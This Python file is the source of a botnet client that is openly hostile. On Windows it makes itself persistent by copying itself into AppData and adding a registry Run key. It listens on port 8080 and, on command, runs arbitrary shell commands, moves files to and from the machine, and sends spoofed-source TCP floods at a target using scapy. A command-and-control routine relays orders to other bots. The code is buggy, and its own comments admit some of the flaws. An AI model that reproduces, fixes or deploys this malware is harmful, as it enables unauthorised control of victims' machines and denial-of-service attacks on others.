import socket
import threading
import json
import scapy.all
import random
import os
import subprocess
import shutil
import sys
import base64
import time

class Bot():
    def __init__(self, sleep):
        self.sleep = sleep
        self.ip = socket.gethostbyname(socket.gethostname())
        self.become_persistent()
    
    def become_persistent(self): #Persistence only works on Windows
        try:
            copy_location = os.environ['appdata'] + '\\test.exe'
            if not os.path.exists(copy_location):
                shutil.copyfile(sys.executable, copy_location)
                subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "{copy_location}"', shell=True)
        except:
            pass

    def send(self, connection, data):
        json_data = json.dumps(data)
        connection.send(json_data.encode())

    def receive(self, connection):
        json_data = ''
        while True:
            try:
                json_data = json_data + connection.recv(1024).decode()
                self.process(json.loads(json_data), connection)
                break
            except json.decoder.JSONDecodeError:
                continue
 
    def accept(self):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((self.ip, 8080))
        while True:
            listener.listen(0)
            connection, address = listener.accept()
            threading.Thread(target = self.receive(connection)).start()
 
    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, "wb")
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return '[+] Download successfull'
            
    def process(self, command, connection):
        print(command)
        split_command = command.split(' ')
        instruction = split_command[0]
        
        options = []
        options.append(instruction)

        if instruction == 'download':
            if '-f' not in command:
                processed = '[-] Please specify file to download'
                return
            options.append(split_command[split_command.index('-f') + 1])

        elif instruction == 'upload':
            if '-p' not in command:
                processed = '[-] Please specify location of upload file'
                return
            elif not '-f' or '--file' not in command:
                processed = '[-] Please specify file to upload'
                return
          
            options.append(split_command[split_command.index('-p') + 1])
            options.append(split_command[split_command.index('-f') + 1])

        elif instruction == 'ddos':
            if '-d' not in command:
                processed = '[-] Please specify ddos attack target'
                return
            elif '-s'not in command:
                processed = '[-] Please specify source port'
                return
            elif '-t' not in command:
                processed = '[-] Please specify target port'
                return
            elif '-p' not in command:
                processed = '[-] Please specify number of packets'
                return

            options.append(split_command[split_command.index('-d') + 1])
            options.append(split_command[split_command.index('-s') + 1])
            options.append(split_command[split_command.index('-t') + 1])
            options.append(split_command[split_command.index('-p') + 1])
        
        try:
            if options[0] in ['exit', 'close', 'quit']:
                connection.close()
                processed = '[+] Exiting...'
                sys.exit()
            elif options[0] == 'download':
                processed = self.read_file(options[1])
            elif options[0] == 'upload':
                processed = self.write_file(options[1], options[2])
            elif options[0] == 'ddos':
                processed = self.ddos(options[1], options[2], options[3], options[4])
            else:
                processed = self.execute_system_command(instruction)
        except Exception as e:
            processed = f'[-] Error during command execution: \n\n{e}'
            print(processed)
   
        if isinstance(processed, bytes):
            processed = processed.decode()

        print(processed)
        self.send(connection, processed)
       
    def run(self):
        time.sleep(self.sleep)
        threading.Thread(target = self.accept).start()
        self.CNC() #Issue: Becasue the CNC method requires I/O input, it blocks execution of all threads, thus preventing the bot from functioning. 
       
    def CNC(self):
        command = sys.stdin.readline()
        split_command = command.split(' ')
    
        if '-b' not in command:
            print('[-] Please specify the target bot')
            return
    
        bot = split_command[split_command.index('-b') + 1]
        print(command, bot)
    
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection.connect((bot, 8080))
        self.send(connection, command) #Bot bind connects every transmission and therefore cannot bypass firewalls... 

        self.CNC()

    def ddos(self, target_IP, source_port, packets, target_port=80):
        packets_sent = 0

        while packets_sent < packets:
            try:
                randints = [random.randint(0, 255) for i in range(4)]
                source_IP = f'{randints[0]}.{randints[1]}.{randints[2]}.{randints[3]}'
                source_port = random.randint(1, 65535)

                IP1 = scapy.all.IP(src=source_IP, dst=target_IP)
                TCP1 = scapy.all.TCP(sport=source_port, dport=target_port)
                packet = IP1 / TCP1
                scapy.all.send(packet, inter=0.0001, verbose=False)

                packets_sent += 1
            except:
                return '[-] Error during DDoS execution'
        return f'[+] DDoS complete, {packets} packets sent'


bot = Bot(4)
bot.run()
